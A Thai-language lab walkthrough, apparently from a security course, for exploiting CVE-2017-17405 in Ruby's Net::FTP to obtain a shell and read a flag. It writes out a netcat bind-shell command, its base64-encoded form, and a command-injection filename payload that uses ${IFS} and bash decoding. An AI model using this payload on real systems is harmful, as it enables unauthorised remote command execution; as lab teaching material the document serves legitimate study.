# CVE-2017-17405

1. เปิด Lab ขึ้นมาจะพบหน้า Message ของเว็บไซต์พร้อมกับบอกวิธีการโจมตี

[Screen Shot 2562-12-14 at 20.57.18.png](https://media.mooc.ncsa.or.th/courses/1/course-5-2019121428kv9LUIIJ3V3j)

2. Set ให้ Browser ใช้งาน Burp Suite เพื่อให้ง่ายต่อการ replay request โดยกระทำดังนี้

- เปิด Burp Suite ขึ้นมา (วิธีการติดตั้ง Burp Suite ให้ดูได้จาก [https://learn.techsuii.com/p/burp-suite-series](https://learn.techsuii.com/p/burp-suite-series))
- หากเป็น Firefox ให้เข้าไปที่ Edit -> Preferences -> Settings ในส่วน Network Proxy -> กำหนด Configure Proxy เป็น Manual proxy configuration และเลือก HTTP Proxy เป็น 127.0.0.1 Port 8080
- หากเป็น Chrome ให้เลือกเป็น Preferences -> Advanced (ล่างสุด) -> Open Proxy Settings -> จากนั้นกำหนด Proxy เป็น Manual proxy configuration และเลือก HTTP Proxy เป็น 127.0.0.1 Port 8080

[Screen Shot 2562-12-15 at 01.19.54.png](https://media.mooc.ncsa.or.th/courses/1/course-5-2019121428amwSj0Fl5YkD)

3. Request อีกครั้งตามที่ตัวอย่างได้ระบุไว้

[Screen Shot 2562-12-15 at 01.18.30.png](https://media.mooc.ncsa.or.th/courses/1/course-5-2019121428t0z0X4ggJQdy)

4. สร้าง FTP Server ขึ้นมาโดยในที่นี้ใช้ FTP ของ Ruby จะใช้คำสั่งเป็น

```
python -m pyftpdlib -p 2121 -i 0.0.0.0
```

[Screen Shot 2562-12-14 at 21.01.45.png](https://media.mooc.ncsa.or.th/courses/1/course-5-20191214286jjX15pxI7P5)

5. ทีนี้ใน URL นั้นไม่สามารถใส่ค่า / เข้าไปได้ ดังนั้นหากเราต้องการทำ blind shell อย่าง

```
nc -e /bin/bash -lvp 4444
```

จะไม่สามารถทำได้ ดังนั้นเราจะต้องนำค่าของคำสั่งมาทำ base64 ก่อนโดยจะได้ค่าเป็น

```
bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==
```

6. เราสามารถ execute base64 ให้เป็นคำสั่งได้ผ่าน bash command โดยใช้เป็น

```
bash -c '{echo,bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==}|{base64,-d}|{bash,-i}'
```

โดย -c ของ bash หมายถึงการรับคำสั่งผ่าน command string ซึ่งในที่นี้ก็คือ nc -lvp 4444 -e /bin/bash นั่นเอง และ -i ของ bash หมายถึง interactive กล่าวคือหลังจากรันแล้วก็ interact กับ bash นั้นๆด้วย

7. ใส่ใน payload ชื่อไฟล์จะได้เป็น

```
|bash${IFS}-c${IFS}'{echo,bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==}|{base64,-d}|{bash,-i}
```

[Screen Shot 2562-12-15 at 01.15.47.png](https://media.mooc.ncsa.or.th/courses/1/course-5-20191214282EuUSi8kS4HU)

8. กลับมาที่เครื่องของผู้โจมตี ให้ nc เข้าไปที่ port 4444 จะสามารถเข้าไปในเครื่องได้

[Screen Shot 2562-12-15 at 01.15.30.png](https://media.mooc.ncsa.or.th/courses/1/course-5-20191214287q3bPWqfNbnj)

เข้าไปที่ /usr/src/ จากนั้นอ่าน flag เพื่อผ่านหัวข้อนี้